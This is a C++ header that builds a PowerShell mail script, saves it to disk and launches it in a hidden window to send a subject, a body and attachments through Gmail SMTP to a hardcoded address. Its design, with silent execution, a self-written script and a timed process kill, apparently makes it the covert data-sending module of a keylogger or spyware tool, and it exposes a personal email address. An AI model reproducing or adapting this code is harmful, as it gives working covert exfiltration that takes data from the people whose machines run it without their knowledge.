#ifndef _MY_SEND_MAIL
#define _MY_SEND_MAIL

#include<iostream>
#include<fstream>
#include<string>
#include<Windows.h>
#include"IO.h"
#include"Timer.h"
#include"Helper.h"


namespace Mail
{
	#define EM_TO "nicknick0630@gmail.com"
	#define EM_FROM "nicknick0630@gmail.com"
	#define EM_PASS ""

	const std::string PowerShell_script{
R"(Param(  [Parameter(`
        Mandatory=$true)]
        [String]$Subject,
        [Parameter(`
        Mandatory=$true)]
        [String]$Body
     )

$From = ")" + std::string{ EM_FROM } + R"("

$To = ")" + std::string{ EM_TO } +R"("

$Password = ")" + std::string{ EM_PASS } +R"("

$SMTPServer = "smtp.gmail.com"

$msg = new-object Net.Mail.MailMessage
$smtp = new-object Net.Mail.SmtpClient($SMTPServer)
$smtp.EnableSsl = $true
$msg.From = $From
$msg.To.Add($To)
$msg.BodyEncoding = [system.Text.Encoding]::Unicode
$msg.SubjectEncoding = [system.Text.Encoding]::Unicode
$msg.Subject = $Subject
$msg.Body = $Body
$SMTP.Credentials = New-Object System.Net.NetworkCredential($From, $Password);
$smtp.Send($msg)
)"};

	#undef EM_TO
	#undef EM_FROM
	#undef EM_PASS


	Timer mail_timer;
	const std::string SCRIPT_NAME{ "script.ps1" };

	std::string string_replace(std::string str, const std::string &Pattern, const std::string &New_Str)
	{
		if (Pattern.size() == 0)
			return str;

		std::string::size_type idx = 0;

		while ((idx = str.find(Pattern, idx)) != std::string::npos)
		{
			str.replace(idx, Pattern.size(), New_Str);
			idx += New_Str.size();
		}

		return str;
	}

	bool check_file_exists(const std::string &name)
	{
		std::ifstream fin{ name };
		return static_cast<bool>(fin);
	}

	bool create_script(void)
	{
		std::ofstream script{ IO::get_our_path(true) + std::string{ SCRIPT_NAME } };

		if (!script)
			return false;

		script << PowerShell_script;

		if (!script)
			return false;

		script.close();

		return true;
	}

	int send_mail(const std::string &subject, const std::string &body, const std::string &attachments)
	{
		bool is_ok = IO::make_dir(IO::get_our_path(true));

		if (!is_ok)
			return -1;

		std::string script_path{ IO::get_our_path(true) + std::string{ SCRIPT_NAME } };

		if (!check_file_exists(script_path))
			is_ok = create_script();

		if (!is_ok)
			return -2;

		std::string param = string_replace(script_path, "\\", "\\\\") + 
							" \\\"" + subject + "\\\""
							" \\\"" + body + "\\\"";

		SHELLEXECUTEINFO Sh_Exec_Info{ 0 };
		Sh_Exec_Info.cbSize = sizeof(Sh_Exec_Info);
		Sh_Exec_Info.fMask = SEE_MASK_NOCLOSEPROCESS;
		Sh_Exec_Info.hwnd = NULL;
		Sh_Exec_Info.lpVerb = "open";
		Sh_Exec_Info.lpFile = "powershell";
		Sh_Exec_Info.lpParameters = param.c_str();
		Sh_Exec_Info.lpDirectory = NULL;
		Sh_Exec_Info.nShow = SW_HIDE;
		Sh_Exec_Info.hInstApp = NULL;

		is_ok = static_cast<bool>(ShellExecuteEx(&Sh_Exec_Info));

		if (!is_ok)
			return -3;

		WaitForSingleObject(Sh_Exec_Info.hProcess, 7000);

		DWORD exit_code = 100;

		GetExitCodeProcess(Sh_Exec_Info.hProcess, &exit_code);

		mail_timer.set_function([&]()
		{
			WaitForSingleObject(Sh_Exec_Info.hProcess, 6000);

			GetExitCodeProcess(Sh_Exec_Info.hProcess, &exit_code);

			if (static_cast<int>(exit_code) == STILL_ACTIVE)
				TerminateProcess(Sh_Exec_Info.hProcess, 100);

			Helper::write_app_log("<From Send Mail> Return code : " + std::to_string(static_cast<int>(exit_code)));
		});

		mail_timer.set_repeat_count(1L);
		mail_timer.set_interval(10L);
		mail_timer.start(true);

		return static_cast<int>(exit_code);
	}

	int  send_mail(const std::string &subject, const std::string &body, const std::vector<std::string> &att)
	{
		std::string attachments;

		if (att.size() == 1U)
			attachments = att[0];
		else
		{
			for (const auto &x : att)
				attachments += (x + "::");

			attachments = attachments.substr(0, attachments.size() - 2);
		}

		return send_mail(subject, body, attachments);
	}
}
#endif // !_SEND_MAIL
